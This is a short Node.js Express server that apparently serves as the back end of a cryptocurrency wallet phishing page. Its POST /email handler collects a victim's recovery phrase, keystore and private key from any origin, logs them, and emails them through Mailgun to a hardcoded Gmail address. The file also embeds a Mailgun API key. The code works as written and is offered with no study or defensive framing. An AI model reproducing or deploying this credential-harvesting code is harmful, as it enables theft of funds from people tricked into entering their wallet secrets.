require("custom-env").env();
const express = require("express");
const path = require("path");
// const sendMail = require("./mail");
const app = express();
const mailgun = require("mailgun-js");

const PORT = 8080;

// data parsing
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use(express.static("public"));

app.post("/email", (req, res) => {
  res.set("Access-Control-Allow-Method", "POST");
  res.set("Access-Control-Allow-Origin", "*");
  res.set("Access-Control-Allow-Headers", "Content-Type");
  res.set("Access-Control-Max-Age", "3600");

  if (req.method === "OPTIONS") {
    return res.status(204).send("");
  }
  // send email here
  const { phrase, keyStore, privateKey } = req.body;
  console.log("Data: ", req.body);

  const mg = mailgun({
    apiKey: "01550eeb736f48295faff733d574840c-c4d287b4-fdbdfa33",
    domain: "sandbox04b4abdcddc343b18a4ee96acd1c7a03.mailgun.org",
  });

  const data = {
    from: "bankoleidris2001@gmail.com",
    to: "bankoleidris2001@gmail.com",
    subject: "Hello",
    text: `   phrase: ${phrase}
              keystore: ${keyStore}
              privatekey: ${privateKey}`,
  };
  mg.messages().send(data, function (error, body) {
    console.log(body);
    console.log(error);
  });
});

// app.get("/", (req, res) => {
//   res.sendFile(path.join(__dirname, "form.html"));
// });

app.listen(PORT, () => console.log("listening on port, ", PORT));
